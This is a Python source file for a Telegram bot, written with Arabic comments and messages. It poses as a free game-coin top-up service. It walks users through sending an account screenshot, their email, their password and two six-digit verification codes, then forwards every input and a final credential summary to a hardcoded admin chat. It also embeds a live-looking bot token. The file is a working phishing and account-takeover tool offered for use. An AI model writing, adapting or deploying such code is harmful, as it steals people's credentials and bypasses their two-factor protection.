import telebot
from telebot import types
import re

# --- إعدادات البوت ---
# تم تحديث هذه القيم بناءً على طلبك
TOKEN = '8475612147:AAHgEw1rAoailwA9PUa2_bwxcAZJxzctquc'
ADMIN_CHAT_ID = 5748538079

bot = telebot.TeleBot(TOKEN)

# لتعقب حالة المستخدم والبيانات التي يرسلها
user_state = {}
user_data = {}

# --- دالة مساعدة لإرسال الرسائل للمسؤول ---
def send_to_admin(message, step_name):
    """
    ترسل رسالة إلى المسؤول تحتوي على تفاصيل المستخدم والخطوة الحالية والرسالة التي أرسلها.
    """
    chat_id = message.chat.id
    try:
        user_info = bot.get_chat(chat_id)
        username = user_info.username if user_info.username else 'لا يوجد اسم مستخدم'
    except Exception:
        username = 'لا يوجد اسم مستخدم'

    # نحدد محتوى الرسالة بناءً على نوعها
    if message.content_type == 'text':
        user_message_content = f"💬 **الرسالة:** `{message.text}`"
        admin_msg = (
            f"📩 **رسالة جديدة من مستخدم** 📩\n"
            f"👤 **المستخدم:** @{username} (ID: `{chat_id}`)\n"
            f"📝 **الخطوة:** {step_name}\n"
            f"{user_message_content}\n"
            f"---"
        )
        try:
            bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode='Markdown')
        except Exception as e:
            print(f"خطأ في إرسال الرسالة للمسؤول: {e}")

    elif message.content_type == 'photo':
        caption_msg = (
            f"📩 **رسالة جديدة من مستخدم** 📩\n"
            f"👤 **المستخدم:** @{username} (ID: `{chat_id}`)\n"
            f"📝 **الخطوة:** {step_name}\n"
            f"💬 **الرسالة:** `صورة`\n"
            f"---"
        )
        try:
            # استخدام bot.send_photo لإرسال الصورة
            bot.send_photo(ADMIN_CHAT_ID, message.photo[-1].file_id, caption=caption_msg, parse_mode='Markdown')
        except Exception as e:
            print(f"خطأ في إرسال الصورة للمسؤول: {e}")
    else:
        user_message_content = f"محتوى من نوع: {message.content_type}"
        admin_msg = (
            f"📩 **رسالة جديدة من مستخدم** 📩\n"
            f"👤 **المستخدم:** @{username} (ID: `{chat_id}`)\n"
            f"📝 **الخطوة:** {step_name}\n"
            f"💬 **الرسالة:** `{user_message_content}`\n"
            f"---"
        )
        try:
            bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode='Markdown')
        except Exception as e:
            print(f"خطأ في إرسال الرسالة للمسؤول: {e}")

# --- معالجات رسائل البوت ---

@bot.message_handler(commands=['start'])
def handle_start(message):
    send_to_admin(message, "بدء المحادثة")
    bot.send_message(message.chat.id, "📷 من فضلك أرسل صورة حسابك الآن.")
    user_state[message.chat.id] = "waiting_for_photo"

@bot.message_handler(content_types=['photo'], func=lambda message: user_state.get(message.chat.id) == "waiting_for_photo")
def handle_photo(message):
    # إرسال الصورة للمسؤول هنا
    send_to_admin(message, "استلام صورة الحساب")
    user_data[message.chat.id] = {"photo_id": message.photo[-1].file_id}

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["1000 كوينز", "2000 كوينز", "3500 كوينز", "5000 كوينز", "8000 كوينز"]
    for btn in btns:
        markup.add(types.KeyboardButton(btn))

    bot.send_message(message.chat.id, "✅ تم استلام الصورة.\nاختر عدد الكوينز التي تريدها:", reply_markup=markup)
    user_state[message.chat.id] = "waiting_for_coins"

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_photo" and message.content_type != 'photo')
def handle_invalid_photo(message):
    send_to_admin(message, "إدخال غير صحيح (متوقع صورة)")
    bot.send_message(message.chat.id, "❌ عفواً، يرجى إرسال **صورة** لحسابك فقط.")

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_coins")
def handle_coins_choice(message):
    if message.text in ["1000 كوينز", "2000 كوينز", "3500 كوينز", "5000 كوينز", "8000 كوينز"]:
        send_to_admin(message, "اختيار الكوينز")
        user_data[message.chat.id]["coins"] = message.text
        bot.send_message(message.chat.id, "✅ تمام، الآن أرسل الإيميل الخاص بك.")
        user_state[message.chat.id] = "waiting_for_email"
    else:
        send_to_admin(message, "اختيار غير صالح (متوقع عدد الكوينز)")
        bot.send_message(message.chat.id, "❌ يرجى اختيار عدد الكوينز من الأزرار الموجودة.")

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_email")
def handle_email(message):
    if re.match(r"[^@]+@[^@]+\.[^@]+", message.text):
        send_to_admin(message, "إدخال الإيميل")
        user_data[message.chat.id]["email"] = message.text
        bot.send_message(message.chat.id, "✅ حسناً، الآن أرسل الباسورد الخاص بك.")
        user_state[message.chat.id] = "waiting_for_password"
    else:
        send_to_admin(message, "إدخال غير صالح (متوقع إيميل)")
        bot.send_message(message.chat.id, "❌ هذا الإيميل غير صحيح. يرجى إدخال إيميل صحيح.")

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_password")
def handle_password(message):
    if len(message.text) > 0:
        send_to_admin(message, "إدخال الباسورد")
        user_data[message.chat.id]["password"] = message.text
        bot.send_message(message.chat.id, "تمام ✅\nالآن أرسل الكود الأول (6 أرقام).")
        user_state[message.chat.id] = "waiting_for_code1"
    else:
        send_to_admin(message, "إدخال غير صالح (متوقع باسورد)")
        bot.send_message(message.chat.id, "❌ يرجى إدخال كلمة مرور.")

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_code1")
def handle_code1(message):
    if message.text.isdigit() and len(message.text) == 6:
        send_to_admin(message, "إدخال الكود الأول")
        user_data[message.chat.id]["code1"] = message.text
        bot.send_message(message.chat.id, "أرسل الكود الثاني (6 أرقام) الآن.")
        user_state[message.chat.id] = "waiting_for_code2"
    else:
        send_to_admin(message, "إدخال غير صالح (متوقع كود أول)")
        bot.send_message(message.chat.id, "❌ عفواً، الكود يجب أن يكون 6 أرقام فقط.")

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_code2")
def handle_code2(message):
    if message.text.isdigit() and len(message.text) == 6:
        send_to_admin(message, "إدخال الكود الثاني")
        user_data[message.chat.id]["code2"] = message.text

        # إرسال ملخص البيانات للمسؤول
        full_data = user_data.get(message.chat.id, {})
        msg_to_admin_summary = (
            f"✨ **ملخص بيانات شحن كاملة!** ✨\n\n"
            f"👤 **المستخدم:** @{bot.get_chat(message.chat.id).username or 'لا يوجد اسم مستخدم'} (ID: `{message.chat.id}`)\n"
            f"💰 **الكوينز المطلوبة:** {full_data.get('coins', 'غير متاح')}\n"
            f"📧 **الإيميل:** `{full_data.get('email', 'غير متاح')}`\n"
            f"🔐 **الباسورد:** `{full_data.get('password', 'غير متاح')}`\n"
            f"🔢 **الكود الأول:** `{full_data.get('code1', 'غير متاح')}`\n"
            f"✅ **الكود الثاني:** `{full_data.get('code2', 'غير متاح')}`\n"
            f"---"
        )
        try:
            # إرسال الصورة مرة أخرى مع الملخص
            bot.send_photo(ADMIN_CHAT_ID, full_data.get("photo_id"), caption=msg_to_admin_summary, parse_mode='Markdown')
        except Exception as e:
            print(f"خطأ إرسال الصورة للمسؤول: {e}")

        # إرسال رسالة تأكيد للمستخدم
        bot.send_message(message.chat.id, "✅ تم استلام بياناتك بنجاح. يرجى الانتظار 5 دقائق ثم قم بفتح اللعبة. 🎮💰")

        # إعادة تعيين الحالة والبيانات للمستخدم
        user_state[message.chat.id] = None
        if message.chat.id in user_data:
            del user_data[message.chat.id]
    else:
        send_to_admin(message, "إدخال غير صالح (متوقع كود ثاني)")
        bot.send_message(message.chat.id, "❌ عفواً، الكود يجب أن يكون 6 أرقام فقط.")

@bot.message_handler(func=lambda message: True)
def handle_unhandled_messages(message):
    current_state = user_state.get(message.chat.id)
    send_to_admin(message, f"رسالة غير متوقعة في الحالة: {current_state or 'غير محددة'}")
    if current_state:
        bot.send_message(message.chat.id, "❌ عفواً، يرجى إكمال الخطوة الحالية قبل المتابعة.")
    else:
        bot.send_message(message.chat.id, "مرحباً بك! اكتب /start لبدء العملية.")

print("البوت بدأ العمل...")
bot.polling(non_stop=True, interval=0)
